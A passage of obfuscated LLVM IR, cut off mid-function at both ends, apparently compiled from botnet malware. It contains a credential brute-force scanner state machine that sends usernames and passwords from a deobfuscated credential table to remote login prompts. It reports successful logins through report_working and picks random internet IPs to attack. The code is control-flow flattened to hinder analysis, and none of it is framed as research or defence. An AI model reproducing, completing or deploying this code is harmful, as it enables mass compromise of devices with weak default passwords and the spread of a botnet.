  %779 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %780 = call i32 @consume_user_prompt(%struct.scanner_connection* %779)
  store i32 %780, i32* %33, align 4
  %781 = icmp sgt i32 %780, 0
  %782 = select i1 %781, i32 1926113471, i32 -2134981543
  store i32 %782, i32* %switchVar
  br label %loopEnd

; <label>:783:                                    ; preds = %loopEntry
  %784 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %785 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %784, i32 0, i32 1
  %786 = load i32, i32* %785, align 8
  %787 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %788 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %787, i32 0, i32 0
  %789 = load %struct.scanner_auth*, %struct.scanner_auth** %788, align 8
  %790 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %789, i32 0, i32 0
  %791 = load i8*, i8** %790, align 8
  %792 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %793 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %792, i32 0, i32 0
  %794 = load %struct.scanner_auth*, %struct.scanner_auth** %793, align 8
  %795 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %794, i32 0, i32 4
  %796 = load i8, i8* %795, align 4
  %797 = zext i8 %796 to i64
  %798 = call i64 @send(i32 %786, i8* %791, i64 %797, i32 16384)
  %799 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %800 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %799, i32 0, i32 1
  %801 = load i32, i32* %800, align 8
  %802 = call i64 @send(i32 %801, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %803 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %804 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %803, i32 0, i32 3
  store i32 4, i32* %804, align 8
  store i32 -2134981543, i32* %switchVar
  br label %loopEnd

; <label>:805:                                    ; preds = %loopEntry
  store i32 -1242038026, i32* %switchVar
  br label %loopEnd

; <label>:806:                                    ; preds = %loopEntry
  %807 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %808 = call i32 @consume_pass_prompt(%struct.scanner_connection* %807)
  store i32 %808, i32* %33, align 4
  %809 = icmp sgt i32 %808, 0
  %810 = select i1 %809, i32 548465143, i32 1592707820
  store i32 %810, i32* %switchVar
  br label %loopEnd

; <label>:811:                                    ; preds = %loopEntry
  %812 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %813 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %812, i32 0, i32 1
  %814 = load i32, i32* %813, align 8
  %815 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %816 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %815, i32 0, i32 0
  %817 = load %struct.scanner_auth*, %struct.scanner_auth** %816, align 8
  %818 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %817, i32 0, i32 1
  %819 = load i8*, i8** %818, align 8
  %820 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %821 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %820, i32 0, i32 0
  %822 = load %struct.scanner_auth*, %struct.scanner_auth** %821, align 8
  %823 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %822, i32 0, i32 5
  %824 = load i8, i8* %823, align 1
  %825 = zext i8 %824 to i64
  %826 = call i64 @send(i32 %814, i8* %819, i64 %825, i32 16384)
  %827 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %828 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %827, i32 0, i32 1
  %829 = load i32, i32* %828, align 8
  %830 = call i64 @send(i32 %829, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %831 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %832 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %831, i32 0, i32 3
  store i32 5, i32* %832, align 8
  store i32 1592707820, i32* %switchVar
  br label %loopEnd

; <label>:833:                                    ; preds = %loopEntry
  store i32 -1242038026, i32* %switchVar
  br label %loopEnd

; <label>:834:                                    ; preds = %loopEntry
  %835 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %836 = call i32 @consume_any_prompt(%struct.scanner_connection* %835)
  store i32 %836, i32* %33, align 4
  %837 = icmp sgt i32 %836, 0
  %838 = select i1 %837, i32 844353788, i32 295002014
  store i32 %838, i32* %switchVar
  br label %loopEnd

; <label>:839:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 5)
  %840 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %840, i8** %34, align 8
  %841 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %842 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %841, i32 0, i32 1
  %843 = load i32, i32* %842, align 8
  %844 = load i8*, i8** %34, align 8
  %845 = load i32, i32* %35, align 4
  %846 = sext i32 %845 to i64
  %847 = call i64 @send(i32 %843, i8* %844, i64 %846, i32 16384)
  %848 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %849 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %848, i32 0, i32 1
  %850 = load i32, i32* %849, align 8
  %851 = call i64 @send(i32 %850, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %852 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %853 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %852, i32 0, i32 3
  store i32 6, i32* %853, align 8
  store i32 295002014, i32* %switchVar
  br label %loopEnd

; <label>:854:                                    ; preds = %loopEntry
  store i32 -1242038026, i32* %switchVar
  br label %loopEnd

; <label>:855:                                    ; preds = %loopEntry
  %856 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %857 = call i32 @consume_any_prompt(%struct.scanner_connection* %856)
  store i32 %857, i32* %33, align 4
  %858 = icmp sgt i32 %857, 0
  %859 = select i1 %858, i32 -64280984, i32 -1783820832
  store i32 %859, i32* %switchVar
  br label %loopEnd

; <label>:860:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 6)
  %861 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %861, i8** %36, align 8
  %862 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %863 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %862, i32 0, i32 1
  %864 = load i32, i32* %863, align 8
  %865 = load i8*, i8** %36, align 8
  %866 = load i32, i32* %37, align 4
  %867 = sext i32 %866 to i64
  %868 = call i64 @send(i32 %864, i8* %865, i64 %867, i32 16384)
  %869 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %870 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %869, i32 0, i32 1
  %871 = load i32, i32* %870, align 8
  %872 = call i64 @send(i32 %871, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %873 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %874 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %873, i32 0, i32 3
  store i32 7, i32* %874, align 8
  store i32 -1783820832, i32* %switchVar
  br label %loopEnd

; <label>:875:                                    ; preds = %loopEntry
  store i32 -1242038026, i32* %switchVar
  br label %loopEnd

; <label>:876:                                    ; preds = %loopEntry
  %877 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %878 = call i32 @consume_any_prompt(%struct.scanner_connection* %877)
  store i32 %878, i32* %33, align 4
  %879 = icmp sgt i32 %878, 0
  %880 = select i1 %879, i32 788020464, i32 -1923219973
  store i32 %880, i32* %switchVar
  br label %loopEnd

; <label>:881:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 4)
  %882 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %882, i8** %38, align 8
  %883 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %884 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %883, i32 0, i32 1
  %885 = load i32, i32* %884, align 8
  %886 = load i8*, i8** %38, align 8
  %887 = load i32, i32* %39, align 4
  %888 = sext i32 %887 to i64
  %889 = call i64 @send(i32 %885, i8* %886, i64 %888, i32 16384)
  %890 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %891 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %890, i32 0, i32 1
  %892 = load i32, i32* %891, align 8
  %893 = call i64 @send(i32 %892, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %894 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %895 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %894, i32 0, i32 3
  store i32 8, i32* %895, align 8
  store i32 -1923219973, i32* %switchVar
  br label %loopEnd

; <label>:896:                                    ; preds = %loopEntry
  store i32 -1242038026, i32* %switchVar
  br label %loopEnd

; <label>:897:                                    ; preds = %loopEntry
  %898 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %899 = call i32 @consume_any_prompt(%struct.scanner_connection* %898)
  store i32 %899, i32* %33, align 4
  %900 = icmp sgt i32 %899, 0
  %901 = select i1 %900, i32 -773159092, i32 366000576
  store i32 %901, i32* %switchVar
  br label %loopEnd

; <label>:902:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 7)
  %903 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %903, i8** %40, align 8
  %904 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %905 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %904, i32 0, i32 1
  %906 = load i32, i32* %905, align 8
  %907 = load i8*, i8** %40, align 8
  %908 = load i32, i32* %41, align 4
  %909 = sext i32 %908 to i64
  %910 = call i64 @send(i32 %906, i8* %907, i64 %909, i32 16384)
  %911 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %912 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %911, i32 0, i32 1
  %913 = load i32, i32* %912, align 8
  %914 = call i64 @send(i32 %913, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %915 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %916 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %915, i32 0, i32 3
  store i32 9, i32* %916, align 8
  store i32 366000576, i32* %switchVar
  br label %loopEnd

; <label>:917:                                    ; preds = %loopEntry
  store i32 -1242038026, i32* %switchVar
  br label %loopEnd

; <label>:918:                                    ; preds = %loopEntry
  %919 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %920 = call i32 @consume_any_prompt(%struct.scanner_connection* %919)
  store i32 %920, i32* %33, align 4
  %921 = icmp sgt i32 %920, 0
  %922 = select i1 %921, i32 1370989852, i32 -1195941038
  store i32 %922, i32* %switchVar
  br label %loopEnd

; <label>:923:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 8)
  %924 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %924, i8** %42, align 8
  %925 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %926 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %925, i32 0, i32 1
  %927 = load i32, i32* %926, align 8
  %928 = load i8*, i8** %42, align 8
  %929 = load i32, i32* %43, align 4
  %930 = sext i32 %929 to i64
  %931 = call i64 @send(i32 %927, i8* %928, i64 %930, i32 16384)
  %932 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %933 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %932, i32 0, i32 1
  %934 = load i32, i32* %933, align 8
  %935 = call i64 @send(i32 %934, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %936 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %937 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %936, i32 0, i32 3
  store i32 10, i32* %937, align 8
  store i32 -1195941038, i32* %switchVar
  br label %loopEnd

; <label>:938:                                    ; preds = %loopEntry
  store i32 -1242038026, i32* %switchVar
  br label %loopEnd

; <label>:939:                                    ; preds = %loopEntry
  %940 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %941 = call i32 @consume_resp_prompt(%struct.scanner_connection* %940)
  store i32 %941, i32* %33, align 4
  %942 = load i32, i32* %33, align 4
  %943 = icmp eq i32 %942, -1
  %944 = select i1 %943, i32 1702295339, i32 1386251401
  store i32 %944, i32* %switchVar
  br label %loopEnd

; <label>:945:                                    ; preds = %loopEntry
  %946 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %947 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %946, i32 0, i32 1
  %948 = load i32, i32* %947, align 8
  %949 = call i32 @close(i32 %948)
  %950 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %951 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %950, i32 0, i32 1
  store i32 -1, i32* %951, align 8
  %952 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %953 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %952, i32 0, i32 8
  %954 = load i8, i8* %953, align 8
  %955 = add i8 %954, 1
  store i8 %955, i8* %953, align 8
  %956 = zext i8 %955 to i32
  %957 = icmp eq i32 %956, 10
  %958 = select i1 %957, i32 614937955, i32 1238923468
  store i32 %958, i32* %switchVar
  br label %loopEnd

; <label>:959:                                    ; preds = %loopEntry
  %960 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %961 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %960, i32 0, i32 8
  store i8 0, i8* %961, align 8
  %962 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %963 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %962, i32 0, i32 3
  store i32 0, i32* %963, align 8
  store i32 -896950161, i32* %switchVar
  br label %loopEnd

; <label>:964:                                    ; preds = %loopEntry
  %965 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %965)
  store i32 -896950161, i32* %switchVar
  br label %loopEnd

; <label>:966:                                    ; preds = %loopEntry
  store i32 684617584, i32* %switchVar
  br label %loopEnd

; <label>:967:                                    ; preds = %loopEntry
  %968 = load i32, i32* %33, align 4
  %969 = icmp sgt i32 %968, 0
  %970 = select i1 %969, i32 -980697770, i32 -818220828
  store i32 %970, i32* %switchVar
  br label %loopEnd

; <label>:971:                                    ; preds = %loopEntry
  %972 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %973 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %972, i32 0, i32 4
  %974 = load i32, i32* %973, align 4
  %975 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %976 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %975, i32 0, i32 5
  %977 = load i16, i16* %976, align 8
  %978 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %979 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %978, i32 0, i32 0
  %980 = load %struct.scanner_auth*, %struct.scanner_auth** %979, align 8
  call void @report_working(i32 %974, i16 zeroext %977, %struct.scanner_auth* %980)
  %981 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %982 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %981, i32 0, i32 1
  %983 = load i32, i32* %982, align 8
  %984 = call i32 @close(i32 %983)
  %985 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %986 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %985, i32 0, i32 1
  store i32 -1, i32* %986, align 8
  %987 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %988 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %987, i32 0, i32 3
  store i32 0, i32* %988, align 8
  store i32 -818220828, i32* %switchVar
  br label %loopEnd

; <label>:989:                                    ; preds = %loopEntry
  store i32 684617584, i32* %switchVar
  br label %loopEnd

; <label>:990:                                    ; preds = %loopEntry
  store i32 -1242038026, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 412841872, i32* %switchVar
  br label %loopEnd

; <label>:991:                                    ; preds = %loopEntry
  store i32 0, i32* %33, align 4
  store i32 -1242038026, i32* %switchVar
  br label %loopEnd

; <label>:992:                                    ; preds = %loopEntry
  %993 = load i32, i32* %33, align 4
  %994 = icmp eq i32 %993, 0
  %995 = select i1 %994, i32 -334086064, i32 492267628
  store i32 %995, i32* %switchVar
  br label %loopEnd

; <label>:996:                                    ; preds = %loopEntry
  store i32 352134948, i32* %switchVar
  br label %loopEnd

; <label>:997:                                    ; preds = %loopEntry
  %998 = load i32, i32* %33, align 4
  %999 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1000 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %999, i32 0, i32 6
  %1001 = load i32, i32* %1000, align 4
  %1002 = icmp sgt i32 %998, %1001
  %1003 = select i1 %1002, i32 -468941522, i32 1401866364
  store i32 %1003, i32* %switchVar
  br label %loopEnd

; <label>:1004:                                   ; preds = %loopEntry
  %1005 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1006 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1005, i32 0, i32 6
  %1007 = load i32, i32* %1006, align 4
  store i32 %1007, i32* %33, align 4
  store i32 1401866364, i32* %switchVar
  br label %loopEnd

; <label>:1008:                                   ; preds = %loopEntry
  %1009 = load i32, i32* %33, align 4
  %1010 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1011 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1010, i32 0, i32 6
  %1012 = load i32, i32* %1011, align 4
  %1013 = sub nsw i32 %1012, %1009
  store i32 %1013, i32* %1011, align 4
  %1014 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1015 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1014, i32 0, i32 7
  %1016 = getelementptr inbounds [256 x i8], [256 x i8]* %1015, i32 0, i32 0
  %1017 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1018 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1017, i32 0, i32 7
  %1019 = getelementptr inbounds [256 x i8], [256 x i8]* %1018, i32 0, i32 0
  %1020 = load i32, i32* %33, align 4
  %1021 = sext i32 %1020 to i64
  %1022 = getelementptr inbounds i8, i8* %1019, i64 %1021
  %1023 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1024 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1023, i32 0, i32 6
  %1025 = load i32, i32* %1024, align 4
  %1026 = sext i32 %1025 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1016, i8* %1022, i64 %1026, i32 1, i1 false)
  store i32 1955059999, i32* %switchVar
  br label %loopEnd

; <label>:1027:                                   ; preds = %loopEntry
  store i32 376739106, i32* %switchVar
  br label %loopEnd

; <label>:1028:                                   ; preds = %loopEntry
  store i32 -1094098438, i32* %switchVar
  br label %loopEnd

; <label>:1029:                                   ; preds = %loopEntry
  store i32 -1925528720, i32* %switchVar
  br label %loopEnd

; <label>:1030:                                   ; preds = %loopEntry
  store i32 1191869318, i32* %switchVar
  br label %loopEnd

; <label>:1031:                                   ; preds = %loopEntry
  %1032 = load i32, i32* %1, align 4
  %1033 = add nsw i32 %1032, 1
  store i32 %1033, i32* %1, align 4
  store i32 954542516, i32* %switchVar
  br label %loopEnd

; <label>:1034:                                   ; preds = %loopEntry
  store i32 -2090255881, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %1034, %1031, %1030, %1029, %1028, %1027, %1008, %1004, %997, %996, %992, %991, %NewDefault, %990, %989, %971, %967, %966, %964, %959, %945, %939, %938, %923, %918, %917, %902, %897, %896, %881, %876, %875, %860, %855, %854, %839, %834, %833, %811, %806, %805, %783, %778, %777, %774, %769, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %755, %746, %745, %744, %742, %737, %723, %718, %713, %709, %707, %686, %674, %668, %667, %661, %660, %642, %641, %630, %622, %618, %609, %591, %590, %580, %576, %571, %569, %567, %560, %557, %556, %555, %554, %550, %528, %522, %521, %517, %495, %489, %488, %483, %482, %480, %475, %467, %455, %446, %431, %427, %426, %417, %416, %407, %406, %394, %393, %389, %386, %385, %379, %370, %366, %364, %363, %351, %350, %342, %341, %333, %332, %324, %323, %315, %314, %305, %304, %295, %286, %285, %278, %277, %270, %269, %264, %263, %258, %253, %236, %235, %234, %231, %200, %196, %192, %166, %162, %160, %155, %109, %103, %99, %98, %84, %79, %76, %65, %61, %55, %50, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_local_addr() #3

declare void @rand_init() #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = add nsw i32 %10, 1
  %12 = sext i32 %11 to i64
  %13 = mul i64 %12, 24
  %14 = call i8* @realloc(i8* %9, i64 %13) #6
  %15 = bitcast i8* %14 to %struct.scanner_auth*
  store %struct.scanner_auth* %15, %struct.scanner_auth** @auth_table, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call i8* @deobf(i8* %16, i32* %7)
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20
  %22 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i32 0, i32 0
  store i8* %17, i8** %22, align 8
  %23 = load i32, i32* %7, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %26 = load i32, i32* @auth_table_len, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i64 %27
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i32 0, i32 4
  store i8 %24, i8* %29, align 4
  %30 = load i8*, i8** %5, align 8
  %31 = call i8* @deobf(i8* %30, i32* %7)
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %33 = load i32, i32* @auth_table_len, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 %34
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i32 0, i32 1
  store i8* %31, i8** %36, align 8
  %37 = load i32, i32* %7, align 4
  %38 = trunc i32 %37 to i8
  %39 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %40 = load i32, i32* @auth_table_len, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i64 %41
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i32 0, i32 5
  store i8 %38, i8* %43, align 1
  %44 = load i16, i16* @auth_table_max_weight, align 2
  %45 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %46 = load i32, i32* @auth_table_len, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i64 %47
  %49 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i32 0, i32 2
  store i16 %44, i16* %49, align 8
  %50 = load i16, i16* @auth_table_max_weight, align 2
  %51 = zext i16 %50 to i32
  %52 = load i16, i16* %6, align 2
  %53 = zext i16 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = trunc i32 %54 to i16
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %57 = load i32, i32* @auth_table_len, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* @auth_table_len, align 4
  %59 = sext i32 %57 to i64
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i64 %59
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 3
  store i16 %55, i16* %61, align 2
  %62 = load i16, i16* %6, align 2
  %63 = zext i16 %62 to i32
  %64 = load i16, i16* @auth_table_max_weight, align 2
  %65 = zext i16 %64 to i32
  %66 = add nsw i32 %65, %63
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  %switchVar = alloca i32
  store i32 622199045, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 622199045, label %6
    i32 -2059162509, label %23
    i32 -485886590, label %28
    i32 -95821331, label %33
    i32 -897903586, label %38
    i32 -1888424889, label %43
    i32 2040977284, label %48
    i32 1785456923, label %53
    i32 1464391366, label %58
    i32 1365170906, label %63
    i32 1011289696, label %68
    i32 1395002208, label %73
    i32 319205947, label %78
    i32 156181057, label %83
    i32 103078918, label %88
    i32 -1129412846, label %93
    i32 -1424653634, label %98
    i32 -480210197, label %103
    i32 -375615131, label %108
    i32 1495693000, label %113
    i32 -1979237151, label %118
    i32 1487241361, label %123
    i32 1713188423, label %128
    i32 -1650706473, label %133
    i32 -1652592031, label %138
    i32 2134371038, label %143
    i32 385596256, label %148
    i32 -589051870, label %153
    i32 1379180950, label %158
    i32 970279813, label %163
    i32 1146300362, label %168
    i32 712371570, label %173
    i32 209685172, label %178
    i32 -1646251723, label %183
    i32 -1397873387, label %188
    i32 1074400867, label %193
    i32 251173379, label %198
    i32 43505548, label %203
    i32 586411158, label %208
    i32 -1082729019, label %213
    i32 -609513478, label %218
    i32 -1536602322, label %223
    i32 -513218937, label %228
    i32 1621724471, label %233
    i32 -1934847558, label %238
    i32 -1631280444, label %243
    i32 454417882, label %248
    i32 -1993067376, label %253
    i32 -94866011, label %258
    i32 553613521, label %263
    i32 916761350, label %268
    i32 1009654242, label %272
    i32 -1579299619, label %273
    i32 943692013, label %275
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = load i32, i32* %1, align 4
  %9 = and i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* %2, align 1
  %11 = load i32, i32* %1, align 4
  %12 = lshr i32 %11, 8
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %3, align 1
  %15 = load i32, i32* %1, align 4
  %16 = lshr i32 %15, 16
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %4, align 1
  %19 = load i32, i32* %1, align 4
  %20 = lshr i32 %19, 24
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %5, align 1
  store i32 -2059162509, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8, i8* %2, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 127
  %27 = select i1 %26, i32 -1579299619, i32 -485886590
  store i32 %27, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i8, i8* %2, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 0
  %32 = select i1 %31, i32 -1579299619, i32 -95821331
  store i32 %32, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8, i8* %2, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 3
  %37 = select i1 %36, i32 -1579299619, i32 -897903586
  store i32 %37, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i8, i8* %2, align 1
